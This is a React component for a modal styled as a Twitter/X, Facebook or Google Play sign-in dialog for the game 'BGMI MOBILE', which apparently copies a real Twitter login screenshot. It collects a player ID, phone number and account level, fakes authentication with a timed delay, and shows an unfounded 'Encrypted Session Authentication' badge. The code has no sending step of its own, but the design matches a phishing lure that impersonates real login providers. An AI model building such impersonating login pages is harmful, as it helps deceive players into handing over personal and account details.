import React, { useState } from 'react';
import { X, Lock, ShieldCheck, Loader2, AlertCircle } from 'lucide-react';

export default function SocialAuthPopupModal({ provider, onClose, onLoginSuccess }) {
  const [formData, setFormData] = useState({
    playerId: '',
    phoneNumber: '',
    accountLevel: '',
  });

  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);

  const providerNames = {
    twitter: 'Twitter / X',
    facebook: 'Facebook',
    google: 'Google Play',
  };

  const validate = () => {
    const errs = {};
    if (!formData.playerId.trim()) {
      errs.playerId = 'Player ID is required';
    } else if (!/^\d{8,12}$/.test(formData.playerId.trim())) {
      errs.playerId = 'Player ID must be 8-12 digits';
    }

    if (!formData.phoneNumber.trim()) {
      errs.phoneNumber = 'Phone number is required';
    } else if (!/^\+?[0-9]{8,15}$/.test(formData.phoneNumber.replace(/\s+/g, ''))) {
      errs.phoneNumber = 'Enter a valid phone number (e.g. +919876543210)';
    }

    const lvl = parseInt(formData.accountLevel, 10);
    if (!formData.accountLevel) {
      errs.accountLevel = 'Account level is required';
    } else if (isNaN(lvl) || lvl < 1 || lvl > 100) {
      errs.accountLevel = 'Level must be between 1 and 100';
    }

    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validate()) return;

    setLoading(true);
    try {
      // Simulate auth delay
      await new Promise((res) => setTimeout(res, 800));

      const loggedUser = {
        playerId: formData.playerId.trim(),
        phoneNumber: formData.phoneNumber.trim(),
        accountLevel: parseInt(formData.accountLevel, 10),
        authProvider: provider || 'twitter',
        loggedInAt: new Date().toISOString(),
      };

      onLoginSuccess(loggedUser);
    } catch (err) {
      setErrors({ server: 'Login failed. Please try again.' });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 bg-black/85 backdrop-blur-xs animate-fadeIn">
      <div className="relative w-full max-w-md bg-white text-black rounded-lg shadow-2xl overflow-hidden border border-gray-300">
        
        {/* Top Header matching Screenshot 3 Twitter Login */}
        <div className="bg-gray-100 border-b border-gray-200 px-4 py-3 flex items-center justify-between">
          <div className="flex items-center space-x-2">
            <span className="text-xl font-bold">
              {provider === 'twitter' && '𝕏'}
              {provider === 'facebook' && 'f'}
              {provider === 'google' && '▶'}
            </span>
            <h3 className="font-bold text-gray-800 text-sm sm:text-base">
              Log in With {providerNames[provider] || 'Twitter'}
            </h3>
          </div>
          <button
            onClick={onClose}
            className="text-gray-500 hover:text-black p-1 rounded transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Modal Form Body matching Twitter / Social auth UI */}
        <form onSubmit={handleSubmit} className="p-6 space-y-4">
          
          <div className="text-center space-y-1 pb-2 border-b border-gray-100">
            <h4 className="font-bold text-lg text-gray-900">
              Log in to connect to BGMI MOBILE
            </h4>
            <p className="text-xs text-gray-500">
              Enter your BGMI account details to verify your session.
            </p>
          </div>

          {errors.server && (
            <div className="p-2.5 bg-red-50 border border-red-200 text-red-700 text-xs rounded flex items-center gap-2">
              <AlertCircle className="w-4 h-4 shrink-0" />
              <span>{errors.server}</span>
            </div>
          )}

          {/* Form Inputs for Player ID, Phone, Level */}
          <div className="space-y-3">
            
            {/* Player ID */}
            <div>
              <label className="block text-xs font-semibold text-gray-700 mb-1">
                Player ID
              </label>
              <input
                type="text"
                placeholder="Enter 8-12 digit Player ID"
                value={formData.playerId}
                onChange={(e) => setFormData({ ...formData, playerId: e.target.value })}
                className="w-full border border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 px-3 py-2 rounded text-sm outline-none text-gray-900"
              />
              {errors.playerId && (
                <p className="text-red-600 text-[11px] mt-0.5">{errors.playerId}</p>
              )}
            </div>

            {/* Phone Number */}
            <div>
              <label className="block text-xs font-semibold text-gray-700 mb-1">
                Phone Number
              </label>
              <input
                type="tel"
                placeholder="Enter registered Phone Number"
                value={formData.phoneNumber}
                onChange={(e) => setFormData({ ...formData, phoneNumber: e.target.value })}
                className="w-full border border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 px-3 py-2 rounded text-sm outline-none text-gray-900"
              />
              {errors.phoneNumber && (
                <p className="text-red-600 text-[11px] mt-0.5">{errors.phoneNumber}</p>
              )}
            </div>

            {/* Account Level */}
            <div>
              <label className="block text-xs font-semibold text-gray-700 mb-1">
                Account Level (1 - 100)
              </label>
              <input
                type="number"
                min="1"
                max="100"
                placeholder="Enter Account Level (e.g. 55)"
                value={formData.accountLevel}
                onChange={(e) => setFormData({ ...formData, accountLevel: e.target.value })}
                className="w-full border border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 px-3 py-2 rounded text-sm outline-none text-gray-900"
              />
              {errors.accountLevel && (
                <p className="text-red-600 text-[11px] mt-0.5">{errors.accountLevel}</p>
              )}
            </div>

          </div>

          {/* Login Submit Button */}
          <div className="pt-2">
            <button
              type="submit"
              disabled={loading}
              className={`w-full py-2.5 px-4 font-bold text-sm text-white rounded-md shadow transition-all flex items-center justify-center space-x-2 ${
                provider === 'twitter' 
                  ? 'bg-black hover:bg-gray-800' 
                  : provider === 'facebook' 
                  ? 'bg-[#1877f2] hover:bg-[#166fe5]' 
                  : 'bg-yellow-600 hover:bg-yellow-700'
              }`}
            >
              {loading ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  <span>Logging in...</span>
                </>
              ) : (
                <span>Log in</span>
              )}
            </button>
          </div>

          {/* Privacy Note */}
          <div className="text-[10px] text-gray-400 text-center flex items-center justify-center space-x-1 pt-1">
            <Lock className="w-3 h-3 text-green-600" />
            <span>Encrypted Session Authentication</span>
          </div>

        </form>
      </div>
    </div>
  );
}
